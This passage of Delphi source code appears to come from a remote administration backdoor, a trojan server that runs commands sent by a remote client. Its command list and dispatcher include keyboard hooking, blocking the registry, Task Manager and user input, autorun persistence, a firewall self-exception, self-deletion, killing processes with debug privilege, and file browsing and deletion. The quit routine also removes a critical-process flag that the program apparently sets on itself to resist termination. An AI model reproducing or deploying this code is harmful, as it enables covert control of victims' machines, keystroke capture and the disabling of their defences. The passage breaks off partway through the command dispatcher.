   '   myfire - MyProgram Firewall enable=yes' + LN_FEED +
   '   hddn - SerialNum HDD' + LN_FEED +
   '   autorun - AutoReg programm autorun' + LN_FEED +
   '   hookkb - Hook keyboard' + LN_FEED +
   '   unhookkb - UnHook keyboard' + LN_FEED +
   '   blockreg <command> - Block - 1/UnBlock - 0' + LN_FEED +
   '   blockautorun <command> - Block - 1/UnBlock - 0' + LN_FEED +
   '   blocktm <command> - BlockTaskMgr - 1/UnBlock - 0' + LN_FEED +
   '   blockpsk BlockPusk' + LN_FEED +
   '   unblockpsk UnBlockPusk' + LN_FEED +
   '   hidepsk HidePusk' + LN_FEED +
   '   showpsk ShowPusk' + LN_FEED +
   '   processwat ProcessWatcher' + LN_FEED +
   '   bi - Block input (keyboard and mouse)' + LN_FEED +
   '   ubi - Unblock input (keyboard and mouse)' + LN_FEED +
   '   msg <message> - Show message' + LN_FEED +
   '   print <file> - Print file via printer' + LN_FEED +
   '   reboot - Reboot OS' + LN_FEED +
   '   delserver - Selfdeleting' + LN_FEED + 
   ' END'
   );
End;

Procedure DiskStat(DChar: Char);
// Статистика по диску (объём, занято, свободно)
Var DSz, DfSz, DuSz: Int64;
    DskStr: String;

Begin
   If DChar = #0 Then DChar:=#64; //(64 - 64 = 0)
   DChar:=UpCase(DChar);
   If (DChar < #64) Or (DChar > #90) Then
      Begin
         WriteLf(ErrArray[4]);
         Exit;
      End;
   DfSz  := DiskFree(Ord(DChar) - 64);
   DSz   := DiskSize(Ord(DChar) - 64);
   DuSz  :=DSz - DfSz;
   DfSz  :=Trunc(DfSz/1024);
   DuSz  :=Trunc(DuSz/1024);
   DSz   :=Trunc(DSz/1024);
   GetDir(0, DskStr);
   If (DChar = #64) Then DChar:=DskStr[1]; //Буква текущего диска
   DskStr:='Drive ' + DChar + ' statistics: ' + LN_FEED + ' Size: '
             + IntToStr(DSz) + ' K (' + IntToStr(DSz div 1024) + '.' +
             IntToStr(DSz mod 1024) + ' M)' + LN_FEED
             + ' Free: ' + IntToStr(DfSz) + ' K (' +
             IntToStr(DfSz div 1024) + '.' + IntToStr(DfSz mod 1024) + ' M)'
             + LN_FEED + ' Usage: ' + IntToStr(DuSz) + ' K ('
             + IntToStr(DuSz div 1024) + '.' + IntToStr(DuSz mod 1024) + ' M)';
   WriteLf(DskStr);
End;

Function Pwd: String;
// Выводит текущий каталог
Var CDir: String;
Begin
   GetDir(0,CDir);
   Result:=CDir;
   WriteLf(CDir);
   ShErr;
End;

Procedure Ls(Dir: String);
// Выводит оглавление каталога
Var Sr: TSearchRec;
    DName: String;
    I: Integer;

Begin
   // Каталог не задан - все файлы в текущем
   If Dir = '' Then Dir := Pwd + '\*.*';
   // Каталог оканчивается на \ - все файлы в нём
   If LastDelimiter('\', Dir) = Length(Dir) Then Dir:=Dir + '*.*';
   If FindFirst(Dir, faAnyFile, Sr) <> 0 Then Exit;
   Try
      Repeat
   //      Sr.Time
         // Показ аттрибутов в *nix стиле
         DName:='';
         If (Sr.Attr And faDirectory <> 0) Then DName:=DName + 'd'
         Else DName:=DName + '-';
         If (Sr.Attr And faReadOnly <> 0) Then DName:=DName + 'r'
         Else DName:=DName + '-';
         If (Sr.Attr And faHidden <> 0) Then DName:=DName + 'h'
         Else DName:=DName + '-';
         If (Sr.Attr And faSysFile <> 0) Then DName:=DName + 's'
         Else DName:=DName + '-';
         If (Sr.Attr And faArchive <> 0) Then DName:=DName + 'a'
         Else DName:=DName + '-';
         If (Sr.Attr And faSymLink <> 0) Then DName:=DName + 'l'
         Else DName:=DName + '-';
         DName:=DName + ' ' + Sr.Name;
         FileDateToDateTime(Sr.Time);

         // Извращаюсь :-)
         If (Length(DName) < MaxLn) Then
         For I:=1 To MaxLn - Length(DName)
            Do
               DName:=DName + ' '
         Else DName:=DName + ' ';
         If (Sr.Attr And faDirectory = 0) Then DName:=DName + IntToStr(Sr.Size);
         WriteLf(DName);
      Until FindNext(Sr) <> 0;
   Finally
      FindClose(Sr);
   End;
End;

Function MatchFunct(Name: String; Mask: String): Boolean; overload;
// Тут могут быть ошибки
// Проверяет подходит ли строка под маску
Var NPos, MPos, Nl, Ml: Integer;

Begin
   // Оно не *nix, регистр не различает
   Name := StrUpper(PChar(Name));
   Mask:=StrUpper(PChar(Mask));
   Result:=False;
   NPos:=1;
   MPos:=1;
   Nl:=Length(Name);
   Ml:=Length(Mask);
   While ((NPos <= Nl) And (MPos <= Ml)) Do
   Case Mask[MPos] Of
      '*':
         Begin
            If (MPos >= Ml) Then
               Begin
                  // Маска закончилась, * - последий символ маски
                  Result:=True;
                  Exit;
               End
            Else
            If ((Mask[MPos + 1] = '?') And (NPos + 1 <= Nl)) Then
               Begin
                  // Знак вопроса после * в маске - любой следующий символ в имени
                  MPos:=MPos + 1;
                  NPos:=NPos + 1;
               End
            Else
            // Комбинации ** быть не может (надо их сворачивать)
            If (Pos(Mask[MPos + 1], Name) >= NPos) Then
               Begin
                  MPos:=MPos + 1;
                  NPos:=Pos(Mask[MPos], Name);
               End
            Else Exit;
         End;
      '?':
         Begin
            NPos:=NPos + 1;
            MPos:=MPos + 1;
            // Строка имени закончилась, но в в маске ещё один любой символ
            If (NPos > Nl) Then Exit;
         End;
      Else
         Begin
         // Другие символы маски не соответствуют символам в имени
            If (Name[NPos] <> Mask[MPos]) Then Exit;
            NPos:=NPos + 1;
            MPos:=MPos + 1;
         End;
   End;
   If (MPos < Ml) Then Exit;
   Result:=True;
End;

Function MatchFunct(Sz, MaxSz: LongInt): Boolean; overload;
Begin
   If (Sz >= MaxSz) Then Result:=True
   Else Result:=False;
End;

Procedure SF(FDir: String; FM: String);
// Ищет файл по указанному каталога
Var
  Sr: TSearchRec;
Begin
     FDir:=Trim(FDir);
     FM:=Trim(FM);
  If FindFirst(FDir + ':\'+FM, faAnyFile, Sr) <> 0 Then Exit;
   Try
      Repeat
         If ((Sr.Name = '.') Or (Sr.Name = '..') Or (Sr.Name = '')) Then Continue;
         If (MatchFunct(Sr.Name, FM)) Then WriteLf(Sr.Name);
         If (Sr.Attr And faDirectory <> 0) Then
            Begin
               SF(Sr.Name, FM);
               Continue;
            End;
      Until FindNext(Sr) <> 0;
   Finally
      FindClose(Sr);
   End;
End;

function ExtractFileExt(const FileName: string): string;
var
  I: Integer;
begin
  I := LastDelimiter('.' + PathDelim + DriveDelim, FileName);
  if (I > 0) and (FileName[I] = '.') then
    Result := Copy(FileName, I, MaxInt) else
    Result := '';
end;

procedure GetFilesX(const aPath, Mask: String);
var
      SR: TSearchRec;
      tPath,MS: String;
begin
    {$WARN SYMBOL_PLATFORM OFF}
      MS := Trim(Mask);
      tPath := IncludeTrailingPathDelimiter(aPath);
      if FindFirst(tPath+'\*.*',faAnyFile,SR)=0 then
      begin
        try
          repeat
            if (SR.Name='.') or (SR.Name='..') then Continue;
            if (SR.Attr and faDirectory)<>0 then GetFilesX(tPath+SR.Name,Mask);
            if '*'+ExtractFileExt(SR.Name) = MS then WriteLf(tPath+SR.Name);
          until FindNext(SR)<>0;
        finally
          FindClose(Sr);
        end;
      end;
    {$WARN SYMBOL_PLATFORM ON}
end;

Procedure FindFile(DName, FName: String); overload;
// Ищет файл по маске, начиная с указанного каталога
Var
  Sr: TSearchRec;
Begin
   DName:=IncludeTrailingPathDelimiter(DName);
   DName:=Trim(DName);
   FName:=Trim(FName);
   If FindFirst(DName + '*.*', faAnyFile, Sr) <> 0 Then Exit;
   Try
      Repeat
         If ((Sr.Name = '.') Or (Sr.Name = '..')) Then Continue;
         If (MatchFunct(Sr.Name, FName)) Then WriteLf(DName + Sr.Name);
         If (Sr.Attr And faDirectory <> 0) Then
            Begin
               FindFile(DName + Sr.Name, FName);
               Continue;
            End;
      Until FindNext(Sr) <> 0;
   Finally
      FindClose(Sr);
   End;
End;

Procedure FindFile(DName: String; Sz: Integer); overload;
// Ищет файл больше или равный указанному размеру
// Если установлен аттрибут "скрытый" - показывает
Var
  Sr: TSearchRec;
Begin
   DName:=IncludeTrailingPathDelimiter(DName);
   DName:=Trim(DName);
   If FindFirst(DName + '*.*', faAnyFile, Sr) = 0 Then Exit;
   Try
      Repeat
         If ((Sr.Name = '.') Or (Sr.Name = '..')) Then Continue;
         Sr.Size:=Round(Sr.Size/1024);
         If (MatchFunct(Sr.Size, Sz)) Then
         Begin
            If (Sr.Attr And faHidden <> 0) Then Write('-H- ');
            WriteLf(DName + Sr.Name + ' ' + IntToStr(Sr.Size) + ' K');
         End;
         If (Sr.Attr And faDirectory <> 0) Then
            Begin
               FindFile(DName + Sr.Name, Sz);
               Continue;
            End;
      Until FindNext(Sr) <> 0;
   Finally
      FindClose(Sr);
   End;
End;

Function Rm(const FName: String): Boolean;
// Удаляет файл
Begin
   If Not DeleteFile(PChar(FName)) Then
      Begin
         WriteLf(ErrArray[11]);
         Result:=False;
      End;
   Result:=True;
End;

Procedure Rmr(Nm: String);
// Удаляет КАТАЛОГ рекурсивно
Var
  Sr: TSearchRec;
Begin
   Nm:=IncludeTrailingPathDelimiter(Nm);
   If FindFirst(Nm + '*.*', faAnyFile, Sr) <> 0 Then Exit;
   Try
      Repeat
         If ((Sr.Name = '.') Or (Sr.Name = '..')) Then Continue;
         If (Sr.Attr And faDirectory <> 0) Then
            Begin
               Rmr(Nm + Sr.Name);
               Continue;
            End;
         Rm(Nm + Sr.Name);
      Until FindNext(Sr) <> 0;
   Finally
      FindClose(Sr);
   End;
   RmDir(Nm); // Удаляю уже пустой Nm
End;

Procedure Mv(const Nm1, Nm2: String);
// Переименовыает файл или каталог
Begin
   // Если есть файл с таким именем - удаляю
   If FileExists(Nm2) Then
      If Not Rm(Nm2) Then Exit;
   If Not MoveFile(PChar(Nm1), PChar(Nm2)) Then
      WriteLf(ErrArray[12]);
End;

Function FileSz(const FName: String): Integer;
// Считает размер файла
Var fl: File of Byte;
    LastMode: Integer;
Begin
   Result:=-1;
   AssignFile(Fl, FName);
   LastMode:=FileMode;
   FileMode:=0;
   Reset(fl);
   FileMode:=LastMode;
   If ShErr Then Exit;
   Result:=FileSize(fl);
   CloseFile(fl);
End;

Function Du(const Nm: String): Int64;
// Выводит размер файла или каталога
   Procedure GetDirSize(Const aPath: String; Var SizeDir: Int64);
   // Вкратце: Процедура не моя. Вычисляет размер каталога.
   // Проходит рекурсивно по каталогам.
   // Добавляет к переменной SizeDir новое значение.
   Var
     SR: TSearchRec;
     tPath: string;
   Begin
     tPath := IncludeTrailingPathDelimiter(aPath);
     If FindFirst(tPath + '*.*', faAnyFile, SR) = 0 then
        Begin
          Try
            Repeat
              If (SR.Name = '.') or (SR.Name = '..') Then Continue;
              If (SR.Attr and faDirectory) <> 0 Then
                 Begin
                   GetDirSize(tPath + SR.Name, SizeDir);
                   Continue;
                 End;
              SizeDir := SizeDir +
              (SR.FindData.nFileSizeHigh shl 32) +
              SR.FindData.nFileSizeLow;
            Until FindNext(SR) <> 0;
          Finally
        FindClose(Sr);
        End;
     End;
   End;
Var DSz: Int64;
Begin
   Result:=-1;
   DSz:=0;
   // Если каталог, юзаю GetDirSize, иначе FileSz
   If DirectoryExists(Nm) Then GetDirSize(Nm, DSz)
   Else DSz:=FileSz(Nm);
   Result:=DSz;
End;

Procedure Cp(const Nm1, Nm2: String);
// Копирует файл
Var fl1, fl2: File;
    fBuf: Array[1..Bs] Of Byte;
    Bytes, BytesW, LastMode: Integer;
Begin
   WriteLf('CopyFile: '+Nm1+' \ '+Nm2);
   AssignFile(fl1, Nm1);
   AssignFile(fl2, Nm2);
   LastMode:=FileMode;
   FileMode:=0;
   Reset(fl1, 1);
   If ShErr Then Exit;
   FileMode:=LastMode;
   ReWrite(fl2, 1);
   If ShErr Then
      Begin
         WriteLf('CloseFile: '+Nm1);
         CloseFile(fl1);
         Exit;
      End;
   Repeat
      BlockRead(fl1, fBuf, SizeOf(fBuf), Bytes);
      If ShErr Then
         Begin
            WriteLf('CloseFile: '+Nm1);
            CloseFile(fl1);
            WriteLf('CloseFile: '+Nm2);
            CloseFile(fl2);
            Exit;
         End;
      BlockWrite(fl2, fBuf, Bytes, BytesW);
      If ShErr Then
         Begin
            WriteLf('CloseFile: '+Nm1);
            CloseFile(fl1);
            WriteLf('CloseFile: '+Nm2);
            CloseFile(fl2);
            Exit;
         End;
   Until (Bytes = 0) Or (BytesW <> Bytes);
   CloseFile(fl1);
   CloseFile(fl2);
   WriteLf('CopyFile - OK');
   If (BytesW <> Bytes) Then WriteLf(ErrArray[13]);
End;

Procedure Cat(const FName: String);
// Выводит содержимое файла (она не объединяет файлы, работает только с одним) 
Var fl1: Text;
    fBuf: String;
    LastMode: Integer;
Begin
   AssignFile(fl1, FName);
   LastMode:=FileMode;
   FileMode:=0;
   Reset(fl1);
   If ShErr Then Exit;
   FileMode:=LastMode;
   If ShErr Then
      Begin
         CloseFile(fl1);
         Exit;
      End;
   While Not EOF(fl1)
      Do
         Begin
            ReadLn(fl1, fBuf);
            If ShErr Then
               Begin
                  CloseFile(fl1);
                  Exit;
               End;
            WriteLf(fBuf);
         End;
   CloseFile(fl1);
End;

Procedure Ps;
// Выводит список процессов
Var
   aSnapshotHandle: THandle;
   aProcessEntry32: TProcessEntry32;
   I: Integer;
   bContinue: BOOL;
   PrHandle: THandle;
   ExePath: array[0..MAX_PATH] of Char;
   SysTemDir: array[0..MAX_PATH] of Char;
   WinTemDir: array[0..MAX_PATH] of Char;
   PName: String;
   pmc: PPROCESS_MEMORY_COUNTERS;
   cb:  Integer;
   s,p: string;
   PIDList: string;
   NamesList: string;
   PathsList: string;
Begin
   s:='';
   p:='';
   NamesList:='';
   PIDList:='';
   PathsList:='';
   aSnapshotHandle:=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
   aProcessEntry32.dwSize:=SizeOf(aProcessEntry32);
   {Заголовок списка}
   if aSnapshotHandle = INVALID_HANDLE_VALUE then Exit;
   aProcessEntry32.dwSize := SizeOf(ProcessEntry32);
   PName:='  Executable name';
   For I:=1 To Round(MaxLn/2) Do
   PName:=PName + ' ';
   PName:='PID/Parent PID    '+PName;
   WriteLf(PName);
   {Сам список процессов}
  if Process32First(aSnapshotHandle, aProcessEntry32) then
     WriteLf('-===========FOR WINDOWSXP===========-    ');
  while Process32Next(aSnapshotHandle, aProcessEntry32) do
  begin
    PrHandle:= OpenProcess(PROCESS_QUERY_INFORMATION or PROCESS_VM_READ, False, aProcessEntry32.th32ProcessID);
    GetModuleFileNameEx(aSnapshotHandle, 0, ExePath, MAX_PATH);
    cb:= SizeOf(_PROCESS_MEMORY_COUNTERS);
    GetMem(pmc, cb);
    pmc^.cb := cb;
    GetProcessMemoryInfo(PrHandle, pmc, cb);
    GetSystemDirectory(SysTemDir, MAX_PATH);
    GetWindowsDirectory(WinTemDir, MAX_PATH);
    p:=ExtractFilePath(aProcessEntry32.szExeFile);
    s:=SysTemDir;
    NamesList:=aProcessEntry32.szExeFile;
    PIDList:=IntToStr(aProcessEntry32.th32ProcessID);
    PathsList:=S+'\'+NamesList;
    if FileExists(p+aProcessEntry32.szExeFile) then WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    if FileExists(PathsList) then WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb')
    else
    if aProcessEntry32.szExeFile = 'winlogon.exe' then begin
      PathsList:=SysTemDir + '\winlogon.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'wininit.exe' then begin
      PathsList:=SysTemDir + '\wininit.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'smss.exe' then begin
      PathsList:=SysTemDir + '\smss.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'lsass.exe' then begin
      PathsList:=SysTemDir + '\lsass.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'services.exe' then begin
      PathsList:=SysTemDir + '\services.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'spoolsv.exe' then begin
      PathsList:=SysTemDir + '\spoolsv.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'telnet.exe' then begin
      PathsList:=SysTemDir + '\telnet.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'cmd.exe' then begin
      PathsList:=SysTemDir + '\cmd.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'mdm.exe' then begin
      PathsList:=SysTemDir + '\mdm.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'explorer.exe' then begin
      PathsList:=WinTemDir + '\explorer.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'csrss.exe' then begin
      PathsList:=SysTemDir + '\csrss.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'svchost.exe' then begin
      PathsList:=SysTemDir + '\svchost.exe';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
    if aProcessEntry32.szExeFile = 'System' then begin
      PathsList:='System';
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
    end else
   if ExePath[0] <> '?' then begin
      WriteLf('PID: '+IntToStr(aProcessEntry32.th32ProcessID)+'    : '+PathsList+'  Memory: '+IntToStr(pmc^.WorkingSetSize div 1024) + ' Kb');
   end;
   CloseHandle(PrHandle);
  end;
   WriteLf('-===========PID PROCESS===========-    ');
   bContinue:=Process32First(aSnapshotHandle, aProcessEntry32);
   While Integer(bContinue) <> 0
      Do
         Begin
            PName:=aProcessEntry32.szExeFile;
            If (Length(PName) < MaxLn) Then
            For I:=1 To MaxLn - Length(PName)
               Do
                  PName:=PName + '-'
            Else PName:=PName + '-';
            PName:=PName + ' ' + IntToStr(aProcessEntry32.th32ProcessID) + '<-'
            + IntToStr(aProcessEntry32.th32ParentProcessID);
            WriteLf(PName);
            bContinue:=Process32Next(aSnapshotHandle, aProcessEntry32);
         End;
   CloseHandle(aSnapshotHandle);
End;

Function Kill(const dwPID: Cardinal): Boolean;
// Завершает процесс
Var
 hToken: THandle;
 SeDebugNameValue: Int64;
 tkp: TOKEN_PRIVILEGES;
 ReturnLength: Cardinal;
 hProcess: THandle;
Begin
   Result:=False;
    // Добавляем привилегию SeDebugPrivilege
    // Для начала получаем токен нашего процесса
   If Not OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES Or
      TOKEN_QUERY, hToken) Then Exit;

    // Получаем LUID привилегии
   If Not LookupPrivilegeValue(nil, 'SeDebugPrivilege', SeDebugNameValue) Then
      Begin
         CloseHandle(hToken);
         Exit;
      End;

   Tkp.PrivilegeCount:= 1;
   Tkp.Privileges[0].Luid := SeDebugNameValue;
   Tkp.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;

   // Добавляем привилегию к нашему процессу
   AdjustTokenPrivileges(hToken, False, Tkp, SizeOf(Tkp), Tkp, ReturnLength);
   If GetLastError()<> ERROR_SUCCESS  Then Exit;

   // Завершаем процесс. Если у нас есть SeDebugPrivilege, то мы можем
   // завершить и системный процесс
   // Получаем дескриптор процесса для его завершения
   hProcess:=OpenProcess(PROCESS_TERMINATE, FALSE, dwPID);
   If (hProcess = 0) Then Exit;
   // Завершаем процесс
   If Not TerminateProcess(hProcess, DWORD(-1)) Then Exit;
   CloseHandle(hProcess);

   // Удаляем привилегию
   Tkp.Privileges[0].Attributes:=0;
   AdjustTokenPrivileges(hToken, FALSE, Tkp, SizeOf(tkp), tkp, ReturnLength);
   If (GetLastError<>ERROR_SUCCESS) Then Exit;

   Result:=True;
End;

Function WinReboot: Boolean;
// Перезагружает Windows
var
  hToken: THandle;
  tkp: _TOKEN_PRIVILEGES;
  DUMMY: PTokenPrivileges;
  DummyRL: Cardinal;

Begin
  Result:=False;
  DUMMY:=nil;
  If (Not OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES Or
      TOKEN_QUERY, hToken)) Then Exit;

  If (Not LookupPrivilegeValue(nil, 'SeShutdownPrivilege',
      tkp.Privileges[0].Luid)) Then Exit;

  tkp.PrivilegeCount := 1;
  tkp.Privileges[0].Attributes := $0002; //SE_PRIVILEGE_ENABLED = $00002

  AdjustTokenPrivileges(hToken, FALSE, tkp, 0, Dummy, DummyRL);

  If (GetLastError <> ERROR_SUCCESS) Then Exit;

  If (Not ExitWindowsEx(EWX_REBOOT Or EWX_FORCE, 0)) Then Exit;
  Result:=True; // Об этом я, скорее всего, не узнаю
End;

Procedure SExec(const CStr, ToDo: String);
// Выполняет Shell команду
Var Err: Integer;
Begin
   // ToDo: open - открыть объект (файл, папку и т.д.)
   // explore - Запустить Explorer с указанным параметром (я не использую)
   // print - Печать файла
   Err:=ShellExecute(0, PChar(ToDo), PChar(CStr), nil, nil, SW_SHOWNORMAL);
   WriteLf(SysErrorMessage(Err));
End;

// Выводит сообщение
procedure ShowMsgBox(Msg: string; Flags: integer = -1);
begin
  if Flags < 0 then Flags := MB_ICONSTOP;
     MessageBox(0, PChar(Msg), ServiceFileName,
     MB_OK or MB_TASKMODAL or MB_TOPMOST or Flags)
end;

Procedure Do_cmd(Cmd: String);
// Выполняет полученную команду
Var Sz: Int64;
   Procedure Do_int_cmd;
   Var Param1, Param2: String;
      Function GetParams: Boolean;
         Var BSPos: Integer;
            Begin
               BSPos:=Pos(' \ ', Cmd);
               Param1:=Copy(Cmd, 1, BSPos - 1);
               Param2:=Copy(Cmd, BSPos + 2, Length(Cmd));
               If ((Param1 = '') Or (Param2 = '')) Then
                  Begin
                     Result:=False;
                     WriteLf(ErrArray[3]);
                     Exit;
                  End else WriteLf(Param1 + ' \ ' +Param2);
               Result:=True;
            End;
         Function CheckCmd(l_Cmd: String; ErrNum: Byte): Boolean;
         Begin
            If (Cmd = '') Then
               Begin
                  Result:=False;
                  WriteLf(ErrArray[ErrNum]);
               End
            Else Result:=True;
         End;
      Begin
         If (Cmd = '\q') Or (Cmd = '\quit')
            Or (Cmd = '\exit') Or (Cmd = '\bye') Or (Cmd = '\x') Then
            Begin
               //Выключаем критический процесс
            if not RtlAdjustPrivilege($14, True, True, bl) = 0 then begin
               WriteLf('Unable to enable SeDebugPrivilege. Make sure you are running this program as administrator.');
               Exit;
            end;
               BreakOnTermination := 0;
               HRES := NtSetInformationProcess(GetCurrentProcess(), $1D , @BreakOnTermination, SizeOf(BreakOnTermination));
            if HRES = S_OK then
               WriteLf('Successfully canceled critical process status.')
            else WriteLf('Error: Unable to cancel critical process status.');
               WriteLf(Disc_String);
               ClnStop(Srv,Cln);
            End
         Else
         If ((Cmd = '\v') Or (Cmd = '\V')) Then
            Begin
               WriteLf(Ver);
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\cd') Then
            Begin
               ChDir(Copy(Cmd, 5, Length(Cmd) - 4));
               ShErr;
            End
         Else
         If (Cmd = '\pwd') Then
            Begin
               Pwd;
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\ls') Then
            Begin
               ls(Copy(Cmd, 5, Length(Cmd) - 4));
            End
         Else
         If (Trim(Copy(Cmd, 1, 10)) = '\blockreg') Then
            Begin
               BlockReg(StrToIntDef(Copy(Cmd, 11, Length(Cmd) - 10), -1));
            End
         Else
         If (Trim(Copy(Cmd, 1, 14)) = '\blockautorun') Then
            Begin
               BlockAutoRun(StrToIntDef(Copy(Cmd, 15, Length(Cmd) - 14), -1));
            End
         Else
         If (Trim(Copy(Cmd, 1, 9)) = '\blocktm') Then
            Begin
               BlockTaskMgr(StrToIntDef(Copy(Cmd, 10, Length(Cmd) - 9), -1));
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\sf') Then
            Begin
               Cmd:=Copy(Cmd, 5, Length(Cmd) - 4);
               If GetParams Then SF(Param1, Param2);
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\findx') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd) - 7);
               If GetParams Then GetFilesX(Param1, Param2);
            End
         Else         
         If (Trim(Copy(Cmd, 1, 7)) = '\findm') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd) - 7);
               If GetParams Then FindFile(Param1, Param2);
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\finds') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd) - 7);
               If GetParams Then FindFile(Param1, StrToIntDef(Param2, 0));
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\mkdir') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd));
               If (CheckCmd(Cmd, 2)) Then
                  Begin
                     If (Not Forcedirectories(Cmd))
                     Then WriteLf(ErrArray[10]);
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 7)) = '\rmdir') Then
            Begin
               Cmd:=Copy(Cmd, 8, Length(Cmd) - 7);
               If CheckCmd(Cmd, 2) Then
                  Begin
                     RmDir(Cmd);
                     ShErr;
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 5)) = '\cat') Then
            Begin
               Cmd:=Copy(Cmd, 6, Length(Cmd));
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     Cat(Cmd);
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\cp') Then
            Begin
               Cmd:=Copy(Cmd, 5, Length(Cmd));
               If GetParams Then Cp(Param1, Param2);
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\du') Then
            Begin
               Cmd:=Copy(Cmd, 5, Length(Cmd));
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     Sz:=Du(Cmd);
                     If (Sz <> -1) Then
                        Begin
                           Write(Sz);
                           WriteLf(' Blocks');
                           Write(Trunc(Sz/1000));
                           WriteLf(' KB');
                        End
                     Else WriteLf(ErrArray[9]);
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\mv') Then
            Begin
               // Переименование/перемещение
               Cmd := Copy(Cmd, 5, Length(Cmd));
               If GetParams Then Mv(Param1, Param2);
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\rm') Then
            Begin
               // Без точки в конце не работает... :-?
               // Я тупой! Опять длину перепутал! Теперь всё работает.
               Cmd:=Copy(Cmd, 5, Length(Cmd) - 4);
               If (CheckCmd(Cmd, 1)) Then
                  Begin
                     Rm(Cmd);
                     ShErr;
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 5)) = '\rmr') Then
            Begin
               Cmd:=Copy(Cmd, 6, Length(Cmd) - 5);
               If (CheckCmd(Cmd, 2)) Then
                  Begin
                     Rmr(Cmd);
                  End;
            End
         Else
         If (Trim(Copy(Cmd, 1, 4)) = '\ds') Then
            Begin
               // Объём диска
               // Номер диска: 0 - текущий, 1 - A, 2 - B, 3 - C и т.д.
               If (Length(Cmd) < 5) Then DiskStat(#0)
               Else DiskStat(Copy(Cmd, 5, 1)[1]);
            End
         Else
         If (Cmd = '\ps') Then
            Begin
               Ps;
            End
         Else
         If (Cmd = '\dre') Then
            Begin
               DriveEx;
            End
         Else
         If (Cmd = '\getwindows') Then
            Begin
               GetWindowsPath;
            End
         Else
         If (Cmd = '\getcomp') Then
            Begin
               GetCompUser;
            End
         Else
         If (Cmd = '\getsysdir') Then
            Begin
               GetSystemDir;
            End
         Else
         If (Cmd = '\getvidcd') Then
            Begin
               GetVideoCard;
            End
         Else
         If (Cmd = '\blockpsk') Then
            Begin
               BlockPusk;
            End
         Else
         If (Cmd = '\unblockpsk') Then
            Begin
               UnBlockPusk;
            End
         Else
         If (Cmd = '\processwat') Then
            Begin
               ProcessWatcher;
            End
         Else
         If (Cmd = '\hidepsk') Then
            Begin
               HidePusk;
            End
         Else
         If (Cmd = '\showpsk') Then
            Begin
               ShowPusk;
            End
         Else
         If (Cmd = '\getip') Then
